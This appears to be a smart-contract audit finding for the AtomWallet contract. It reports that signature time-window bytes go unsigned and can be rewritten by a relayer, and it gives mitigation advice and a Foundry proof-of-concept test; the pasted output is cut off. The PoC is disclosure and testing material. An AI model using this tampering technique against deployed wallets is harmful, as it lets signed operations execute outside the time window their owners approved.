  "body": "## Finding description and impact\n\n`AtomWallet` supports a 77-byte signature format: `r || s || v || validUntil || validAfter`.\n\nThe root cause is that the wallet does not authenticate the last 12 bytes.\n\nIn [`AtomWallet._validateSignature`](https://github.com/code-423n4/2026-03-intuition/blob/main/src/protocol/wallet/AtomWallet.sol#L294-L310), the contract first calls `_extractValidUntilAndValidAfterFromSignature(userOp.signature)`, which strips off the final 12 bytes and returns only the first 65 bytes as `rawSignature`.\n\nThen the wallet verifies the owner signature only against:\n- `userOpHash`\n- the stripped 65-byte `rawSignature`\n\nThe parsed `validUntil` and `validAfter` values are only packed into `validationData` after recovery succeeds.\n\nIn [`AtomWallet._extractValidUntilAndValidAfterFromSignature`](https://github.com/code-423n4/2026-03-intuition/blob/main/src/protocol/wallet/AtomWallet.sol#L337-L360), the last 12 bytes are treated as metadata and are never included in the signed message.\n\nThis becomes exploitable because [`IEntryPoint.getUserOpHash`](https://github.com/code-423n4/2026-03-intuition/blob/main/lib/account-abstraction/contracts/interfaces/IEntryPoint.sol#L171-L178) explicitly hashes the UserOperation excluding the `signature` field. So changing the last 12 bytes of `userOp.signature` does not change `userOpHash`.\n\nThe project’s own helper also reflects this design: [`_signUserOpHashWithTimeWindow`](https://github.com/code-423n4/2026-03-intuition/blob/main/tests/unit/AtomWallet/AtomWallet.t.sol#L1010-L1020) signs `userOpHash` first and only then appends `validUntil` and `validAfter`.\n\nAs a result, any relayer/bundler that has a valid 77-byte signed operation can arbitrarily rewrite the time-window suffix without invalidating the owner’s signature.\n\nThis lets an attacker:\n- change a future-only operation into one valid immediately\n- remove expiry entirely by changing the suffix to `(0, 0)`\n- extend or shorten the authorization window at will\n\nImpact:\n- the signer’s intended time restriction is not enforced\n- stale signed `AtomWallet` operations can be executed outside the user-approved window\n- since `AtomWallet.execute` can perform arbitrary calls, this can enable unauthorized token transfers, approvals, or other wallet actions at attacker-chosen times\n\n## Recommended mitigation steps\n\nBind the time window to the signed message.\n\nValid fixes include:\n- include `validUntil` and `validAfter` in the signed hash before ECDSA recovery\n- move the time window into a signed UserOperation field or signed typed payload\n- reject the 77-byte mode unless the appended metadata is cryptographically covered by the owner signature",
  "proof_of_concept": "Run:\n```bash\nforge test --match-contract PoCCore --match-test submissionValidity -vv\n```\n\nPoC code:\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { BaseTest } from \"./BaseTest.t.sol\";\n\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\nimport { TransparentUpgradeableProxy } from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\n\n// For _packValidationData\nimport \"@account-abstraction/core/Helpers.sol\";\n\ncontract PoCCore is BaseTest {\n    function test_submissionValidity() external {\n        uint256 ownerPrivateKey = 0xA11CE;\n        address expectedOwner = vm.addr(ownerPrivateKey);\n\n        // AtomWallet.owner() returns multiVault.getAtomWarden() until the wallet is claimed.\n        // Mock it so we control the signer for this PoC.\n        vm.mockCall(\n            address(protocol.multiVault),\n            abi.encodeWithSelector(protocol.multiVault.getAtomWarden.selector),\n            abi.encode(expectedOwner)\n        );\n\n        AtomWallet wallet = _deployWallet();\n        PackedUserOperation memory userOp = _createUserOp(wallet);\n        bytes32 userOpHash = keccak256(abi.encode(userOp));\n\n        // The owner signs only the raw userOpHash. The 12-byte time window is appended after signing.\n        bytes memory rawSignature = _signUserOpHash(ownerPrivateKey, userOpHash);\n\n        uint48 intendedValidAfter = uint48(block.timestamp + 7 days);\n        uint48 intendedValidUntil = uint48(block.timestamp + 8 days);\n\n        userOp.signature = abi.encodePacked(rawSignature, intendedValidUntil, intendedValidAfter);\n\n        resetPrank(ENTRY_POINT);\n        uint256 intendedValidation = wallet.validateUserOp(userOp, userOpHash, 0);\n\n        // An attacker can rewrite the suffix without invalidating the owner's signature.\n        userOp.signature = abi.encodePacked(rawSignature, uint48(0), uint48(0));\n\n        resetPrank(ENTRY_POINT);\n        uint256 tamperedValidation = wallet.validateUserOp(userOp, userOpHash, 0);\n\n        assertEq(intendedValidation, _packValidationData(false, intendedValidUntil, intendedValidAfter));\n        assertEq(tamperedValidation, _packValidationData(false, 0, 0));\n        assertTrue(tamperedValidation != intendedValidation);\n    }\n\n    function _deployWallet() internal returns (AtomWallet wallet) {\n        AtomWallet walletImpl = new AtomWallet();\n        TransparentUpgradeableProxy walletProxy = new TransparentUpgradeableProxy(address(walletImpl), users.admin, \"\");\n        wallet = AtomWallet(payable(address(walletProxy)));\n        wallet.initialize(ENTRY_POINT, address(protocol.multiVault), bytes32(\"atomwallet-time-window-poc\"));\n    }\n\n    function _createUserOp(AtomWallet wallet) internal view returns (PackedUserOperation memory) {\n        bytes memory callData = abi.encodeWithSelector(wallet.execute.selector, users.bob, 1 ether, bytes(\"\"));\n\n        return PackedUserOperation({\n            sender: address(wallet),\n            nonce: 0,\n            initCode: \"\",\n            callData: callData,\n            accountGasLimits: bytes32(uint256(1_000_000) << 128 | 1_000_000),\n            preVerificationGas: 21_000,\n            gasFees: bytes32(uint256(1_000_000_000) << 128 | 1_000_000_000),\n            paymasterAndData: \"\",\n            signature: \"\"\n        });\n    }\n\n    function _signUserOpHash(uint256 signerPrivateKey, bytes32 userOpHash) internal returns (bytes memory) {\n        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, ethSignedMessageHash);\n        return abi.encodePacked(r, s, v);\n    }\n}\n```\n\nOutput:\n```text\nNo files changed, compilation skipped\n2026-03-06T11:24:51.